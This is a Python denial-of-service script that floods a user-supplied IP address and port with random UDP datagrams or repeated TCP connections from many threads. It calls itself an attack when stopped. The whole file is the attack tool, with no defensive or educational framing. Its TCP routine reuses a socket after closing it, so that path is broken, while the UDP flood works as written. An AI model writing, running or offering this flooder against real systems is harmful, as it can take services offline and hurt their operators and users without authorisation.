import socket
import threading
import random
import time


def flood_udp(target_ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        payload_size = random.randint(512, 2048)
        payload = random.randbytes(payload_size)
        try:
            sock.sendto(payload, (target_ip, port))
        except Exception as e:
            print(f"Error: {e}")


def flood_tcp(target_ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    while not stop_event.is_set():
        try:
            sock.connect((target_ip, port))
            sock.send(random.randbytes(1024))
            time.sleep(0.1)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            sock.close()


if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    protocol = input("Enter protocol (UDP/TCP): ").upper()
    num_threads = int(input("Enter number of threads: "))

    stop_event = threading.Event()

    if protocol == "UDP":
        for _ in range(num_threads):
            thread = threading.Thread(target=flood_udp, args=(target_ip, port, stop_event))
            thread.start()
    elif protocol == "TCP":
        for _ in range(num_threads):
            thread = threading.Thread(target=flood_tcp, args=(target_ip, port, stop_event))
            thread.start()
    else:
        print("Unsupported protocol")
        exit()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping the attack...")
        stop_event.set()
